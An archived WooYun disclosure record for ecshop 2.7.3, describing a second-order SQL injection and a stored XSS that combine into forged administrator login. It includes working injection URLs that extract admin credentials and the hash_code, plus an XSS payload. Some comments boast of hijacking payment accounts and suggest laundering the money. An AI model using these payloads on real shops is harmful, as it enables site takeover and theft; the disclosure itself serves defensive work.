{"id": 10934, "wybug_id": "wooyun-2013-023188", "wybug_title": "ecshop最新版本SQL注入+存储XSS=任意管理员登录", "wybug_corp": "ShopEx", "wybug_author": "blue", "wybug_date": "2013-05-06 20:42", "wybug_open_date": "2013-08-04 20:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "存储"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-06-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-04：\t细节向公众公开  简要描述： 一个功能点的SQL注入和存储XSS，内含多种技巧，我觉得我就是个艺术家～～ 详细说明：  刚下的ecshop V2.7.3版本～1.漏洞存在于站外广告统计功能(对应管理后台的报表统计->站外投放JS)，即/affiche.php页面，将from参数(网站来源referer)存储到了数据库表ecs_adsense，而在后台的“站外投放JS”读取出来未过滤又进入了sql语句，导致二次注入。\n/affiche.php 119行$sql = \"INSERT INTO \" . $ecs->table('adsense') . \"(from_ad, referer, clicks) VALUES ('-1', '\" . $site_name . \"', '1')\"; //$site_name即$_GET['from']存库了\n\n/admin/adsense.php 47-49行/* 获取当前广告所产生的订单总数 */$sql2 = 'SELECT COUNT(order_id) FROM ' .$ecs->table('order_info'). \" WHERE from_ad='$rows[ad_id]' AND referer='$rows[referer]'\"; //看到了吧，未再次addslashes导致注入$rows['order_num'] = $db->getOne($sql2);\n2.同时，输出时未对字段referer过滤，导致存储XSS。3.存储XSS得到cookie本来就可以登录后台了，但我咋能这么简单？SQL注入两条得到ecs_shop_config里的hash_code和管理员的username+password，自己生成COOKIE岂不更爽？\n/admin/privilege.php 136-141行if (isset($_POST['remember']))        {            $time = gmtime() + 3600 * 24 * 365;            setcookie('ECSCP[admin_id]',   $row['user_id'],                            $time);            setcookie('ECSCP[admin_pass]', md5($row['password'] . $_CFG['hash_code']), $time);        }\n   漏洞证明：  \nhttp://localhost/test/ecshop/affiche.php?from=a.baidu.com'%20and%201=2%20union%20select%20group_concat(user_id,'|',user_name,'|',password)%20from%20ecs_admin_user%20order%20by%201%20desc%23&ad_id=-1  //注入得管理员信息http://localhost/test/ecshop/affiche.php?from=a.baidu.com'%20and%201=2%20union%20select%20%20value%20FROM%20`ecs_shop_config`%20WHERE%20code%20=%20'hash_code'%20order%20by%201%20desc%23&ad_id=-1 //注入得hash_codehttp://localhost/test/ecshop/affiche.php?from=a.baidu.com%3Cscript%3Ealert(1)%3C/script%3E&ad_id=-1 //XSS，当然，我使用了xsser.me获取页面上的信息\n\n\n\n\n\n\n\n\n   修复方案：  addslashes, 输出时过滤   版权声明：转载请注明来源 blue@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-05-06 21:37 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-06 20:52 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  前排    \n     2013-05-06 21:02 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  艺术家你好    \n     2013-05-06 21:12 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  艺术家你好ps：知道创宇前几天不是爆了漏洞了么     \n     2013-05-06 21:24 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我看到了美元。    \n     2013-05-06 21:59 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  确认了确认了！    \n     2013-05-06 22:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  不科学啊    \n     2013-05-06 23:14 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @xsser 1w毛爷爷到手了？    \n     2013-05-06 23:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @se55i0n 等核心确认吧     \n     2013-05-06 23:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  前排膜拜艺术家！    \n     2013-05-06 23:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @孤独雪狼 求站长透露信息    \n     2013-05-07 08:35 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  1w?    \n     2013-05-10 13:48 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  携全家老小跪求！    \n     2013-05-12 16:21 |    \t\tcmdshell \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        )\t\t \n  @孤独雪狼 求连接地址？    \n     2013-05-16 15:38 |    \t\tby:安全者 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 只做安全者，不做入侵者！)\t\t \n  @小痞子 俺来找你了    \n     2013-05-16 15:39 |    \t\tby:安全者 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 只做安全者，不做入侵者！)\t\t \n  大牛们求互换oday 我有个市场价2W的oday    \n     2013-05-16 16:32 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  @by:安全者 啥oday?    \n     2013-05-16 18:07 |    \t\tby:安全者 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 只做安全者，不做入侵者！)\t\t \n  idc 域名商 只是修改支付宝账号 银行账号 一天几十万 不是问题    \n     2013-05-19 13:36 |    \t\t小痞子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:21        | <xss>alert(\"a\")</xss>￥&@&……dssKhwjcw...)\t\t \n  @by:安全者 这么牛 找人洗吧  包你发财    \n     2013-05-27 14:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个多少米？据说数字哥给1W注入啊    \n     2013-05-27 14:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @wefgod 数字哥不懂 哈哈    \n     2013-05-27 14:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 擦，如果乌云是他两倍，那干脆只搞这个算了，一年挖10多个都过的很潇洒了……    \n     2013-05-27 17:17 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @wefgod 你以为数字哥的钱很好拿啊？端个板凳看把！    \n     2013-05-27 17:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @齐迹 反正我只是路过的……数字哥只给我了很少很少一点……吃个快餐的    \n     2013-09-10 16:26 |    \t\t孤独男孩 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 专注网络信息安全，漏洞发掘，代码审核，云...)\t\t \n  学习学习先。不错不错    \n     2014-02-23 18:03 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @xsser 前台弄过感谢按钮如何？看了好洞忍不住想点~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}